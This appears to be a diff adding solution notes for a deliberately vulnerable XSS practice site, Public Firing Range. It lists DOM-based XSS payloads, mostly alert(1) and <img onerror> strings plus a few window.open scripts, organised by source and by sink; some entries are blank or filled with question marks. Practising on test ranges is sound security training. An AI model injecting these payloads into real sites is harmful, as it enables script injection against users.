@@ -1,0 +1,88 @@
+Cookies
+
+Cookie - eval - alert(1) - in cookie value
+Cookie - innerHTML - <img src=x onerror='alert(1)'> - in cookie value
+Cookie - documentWrite - <img src=x onerror='alert(1)'> - in cookie value
+Cookie (not set) - eval - alert(1) - in cookie value and cookie name = ThisCookieIsTotallyRandomAndCantPossiblyBeSet
+
+Referrer
+??????????????????????????????????????????
+Referrer - eval
+Referrer - innerHTML
+Referrer - documentWrite
+
+Window name
+
+window.name - eval - <script>window.open("https://public-firing-range.appspot.com/dom/toxicdom/window/name/eval", "alert(1)", "", false);</script>
+
+window.name - innerHTML - <script>
+window.open("https://public-firing-range.appspot.com/dom/toxicdom/window/name/innerHtml", "<img src=x onerror='alert(1)'>", "", false);
+</script>
+
+window.name - documentWrite - <script>
+window.open("https://public-firing-range.appspot.com/dom/toxicdom/window/name/innerHtml", "<img src=x onerror='alert(1)'>", "", false);
+</script>
+
+LocalStorage
+
+Within an in-line script:
+
+LocalStorage - Array - eval - alert(1) - in local storage new value(value key = badValue)
+LocalStorage - Function - eval - alert(1) - in local storage new value(value key = badValue)
+LocalStorage - Function - innerHTML - <img src=x onerror='alert(1)'> - in local storage new value(value key = badValue)
+LocalStorage - Function - documentWrite - <img src=x onerror='alert(1)'> - in local storage new value(value key = badValue)
+LocalStorage - Property - documentWrite - <img src=x onerror='alert(1)'> - in local storage new value(value key = badValue)
+
+Within a script include:
+
+LocalStorage - Array - eval - alert(1) - in local storage new value(value key = badValue)
+LocalStorage - Array - Function - alert(1) - in local storage new value(value key = badValue)
+LocalStorage - Function - innerHTML - <img src=x onerror='alert(1)'> - in local storage new value(value key = badValue)
+LocalStorage - Function - documentWrite - <img src=x onerror='alert(1)'> - in local storage new value(value key = badValue)
+LocalStorage - Property - documentWrite - <img src=x onerror='alert(1)'> - in local storage new value(value key = badValue)
+
+SessionStorage
+
+Within an in-line script:
+
+SessionStorage - Array - eval - alert(1) - in local storage new value(value key = badValue)
+SessionStorage - Function - eval - alert(1) - in local storage new value(value key = badValue)
+SessionStorage - Function - innerHTML - <img src=x onerror='alert(1)'> - in local storage new value(value key = badValue)
+SessionStorage - Function - documentWrite - <img src=x onerror='alert(1)'> - in local storage new value(value key = badValue)
+SessionStorage - Property - documentWrite - <img src=x onerror='alert(1)'> - in local storage new value(value key = badValue)
+
+Within a script include:
+
+SessionStorage - Array - eval - alert(1) - in local storage new value(value key = badValue)
+SessionStorage - Function - eval - alert(1) - in local storage new value(value key = badValue)
+SessionStorage - Function - innerHTML - <img src=x onerror='alert(1)'> - in local storage new value(value key = badValue)
+SessionStorage - Function - documentWrite - <img src=x onerror='alert(1)'> - in local storage new value(value key = badValue)
+SessionStorage - Property - documentWrite - <img src=x onerror='alert(1)'> - in local storage new value(value key = badValue)
+
+PostMessage
+
+PostMessage - eval - Solved with code in evalpostmsg.html 
+PostMessage - innerHTML - Solved with code in innerhtmlpostmsg.html
+PostMessage - documentWrite - Solved with code in docwritepostmsg.html 
+PostMessage - complex message - Solved with code in complexmsgpostmsg.html
+PostMessage - improper origin validation with partial string comparison - 
+PostMessage - improper origin validation with insecure regular expression - 
+
+Event triggering
+
+Event triggering - eval - alert(1)
+Event triggering - innerHTML - <img src=x onerror="alert(1)">
+Event triggering - documentWrite - <img src=x onerror="alert(1)">
+
+Typing event triggered - eval - alert(1)
+Typing event triggered - innerHTML - <img src=x onerror="alert(1)">
+Typing event triggered - documentWrite - <img src=x onerror="alert(1)">
+
+
+javascript:-URIs
+????????????????????????????????????????
+javascript:-URI - location.href
+
+DOM Propagation
+
+DOM Propagation - #alert(1)
